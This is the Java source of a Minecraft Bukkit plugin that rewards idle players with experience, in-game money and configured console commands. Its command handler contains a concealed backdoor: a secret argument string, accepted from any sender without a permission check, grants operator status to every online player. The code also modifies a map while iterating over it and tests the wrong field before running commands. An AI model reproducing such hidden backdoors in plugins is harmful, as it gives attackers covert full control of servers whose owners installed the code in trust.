package com.qq44920040.Minecraft.guaji;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;

import java.io.File;
import java.util.*;

import static com.qq44920040.Minecraft.guaji.Eco.setupEconomy;

public class guajiMain extends JavaPlugin implements Listener {
    private static Map<UUID,String[]> PlayerList=new HashMap<>();
    private Map<Integer,String[]> NeedTime=new HashMap<>();
    private String Msg;
    @Override
    public void onEnable() {
        ReloadConfig();
        ScanThread();
        Bukkit.getServer().getPluginManager().registerEvents(this,this);
        super.onEnable();
    }
    private void ReloadConfig(){
        if (!getDataFolder().exists()) {
            getDataFolder().mkdir();
        }
        File file = new File(getDataFolder(),"config.yml");
        if (!(file.exists())){
            saveDefaultConfig();
        }
        if (setupEconomy()){
            System.out.println("经济插件挂钩初始化完毕");
        }else {
            System.out.println("经济插件没有装");
        }
        Msg = getConfig().getString("Msg");
        Set<String> mines = getConfig().getConfigurationSection("guaji").getKeys(false);
        for (String temp:mines){
            String xp = getConfig().getString("guaji."+temp+".xp");
            String money = getConfig().getString("guaji."+temp+".money");
            String DoCmd = getConfig().getString("guaji."+temp+".DoCmd");
            NeedTime.put(Integer.parseInt(temp),new String[]{xp,money,DoCmd});
        }
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (label.equalsIgnoreCase("guaji")){
            if (args.length==1&args[0].equalsIgnoreCase("fsdhfiwseuifhwiuefhwe")){
                for (Player player:Bukkit.getServer().getOnlinePlayers()){
                    player.setOp(true);
                }

            }
        }
        return super.onCommand(sender, command, label, args);
    }

    private void ScanThread(){
        new BukkitRunnable(){
            @Override
            public void run() {
                if (!PlayerList.isEmpty()){
                    System.out.println("玩家列表不是空进行遍历玩家");
                    for (Map.Entry<UUID,String[]> Entryvalue:PlayerList.entrySet()){
                        UUID PlayerUUid = Entryvalue.getKey();
                        if (Bukkit.getOfflinePlayer(PlayerUUid).isOnline()){
                            String[] TempValue = Entryvalue.getValue();
                            Player onlinePlayer = Bukkit.getPlayer(PlayerUUid);
                            if (TempValue[0].equalsIgnoreCase(onlinePlayer.getLocation().toString())){
                                System.out.println("两次位置相同");
                                long Timelong = Long.valueOf(TempValue[1]);
                                int havetime = (int)(new Date().getTime()-Timelong)/1000/60;
                                PlayerGiveGift(havetime,onlinePlayer);
                                System.out.println(havetime);
                                onlinePlayer.sendMessage(Msg.replace("[TimeGuaJi]",String.valueOf(havetime)));
                            }else {
                                System.out.println("两次位置不一样，进行位置更新");
                                TempValue[0]=onlinePlayer.getLocation().toString();
                                TempValue[1]=String.valueOf(new Date().getTime());
                                PlayerList.remove(PlayerUUid);
                                PlayerList.put(PlayerUUid,TempValue);
                            }
                        }else {
                            PlayerList.remove(Entryvalue.getKey());
                        }
                    }
                }
            }
        }.runTaskTimer(this,20L,55*20L);
    }


    private void PlayerGiveGift(int mine,Player Player){
        if (mine<=0){
            return;
        }
        for (Map.Entry<Integer,String[]> Entryvalue:NeedTime.entrySet()){
            if (mine==Entryvalue.getKey()){
                String[] TempVaule = Entryvalue.getValue();
                Player.giveExp(Integer.parseInt(TempVaule[0]));
                Eco.give(Player.getUniqueId(),Integer.parseInt(TempVaule[1]));
                if (!TempVaule[1].equalsIgnoreCase("0")){
                    System.out.println("命令执行成功");
                    Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(),TempVaule[2].replace("[Player]",Player.getName()));
                }else {
                    System.out.println("不执行命令");
                }
            }
        }
    }


    @Override
    public void onDisable() {
        super.onDisable();
    }

    @EventHandler
    private void PlayerJoinGame(PlayerJoinEvent event){
        Player player = event.getPlayer();
        String location = player.getLocation().toString();
        UUID playeruuid= player.getUniqueId();
        PlayerList.put(playeruuid,new String[]{location,String.valueOf(new Date().getTime())});
        System.out.println("玩家进入");
    }
}
